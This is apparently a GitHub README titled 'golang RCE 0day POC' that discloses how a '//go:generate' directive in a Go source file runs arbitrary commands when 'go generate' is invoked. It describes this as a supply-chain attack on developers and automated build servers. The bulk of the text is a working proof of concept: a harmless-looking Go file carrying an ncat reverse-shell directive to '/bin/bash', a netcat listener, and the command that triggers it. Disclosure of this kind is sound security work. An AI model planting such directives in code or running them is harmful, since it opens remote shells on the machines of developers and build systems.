[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/)
[![Top Langs](https://profile-counter.glitch.me/hktalent/count.svg)](https://51pwn.com)

# golang-RCE-0day-POC
golang RCE 0day POC

## see
https://twitter.com/Hktalent3135773/status/1508635999030571008

https://hackerone.com/reports/1525100


https://github.com/golang/go/issues/52059

# It was officially allowed, so it was made public
https://issuetracker.google.com/issues/227263888
Maybe it's not a bug, it's the expected behavior, but it's the way of RCE（Remote Command Execution） attack in the supply chain
The go generate command does not conduct security check. When compiling the associated malicious library and code, it may cause the execution of the "//go:generate [malicious command]"
## Impact

### 1、hacker run
```bash
nc -lv 4444
```
### 2、POC
```go
testRce.go
Code 152 BytesWrap lines Copy Download
package main

import (
       "fmt"
)
//go:generate ncat 127.0.0.1 4444 -e /bin/bash
func main() {
fmt.Println("test go:generate remote command execution ")
}
```
### 3、run build
```bash
go generate -x testRce.go
```
### 4、test command execution
```
in "nc -lv 4444" console
```

Attack scenario:
People who provide golang open source libraries and projects may embed malicious commands, causing users to trigger commands during compilatio
![2022-03-29 10 12 06](https://user-images.githubusercontent.com/18223385/160965966-a00173f8-742d-4a6e-9ee0-ba5e23ac536f.gif)


## 受害者
- Golang developer
- Golang open source automatic compilation integration server
- 
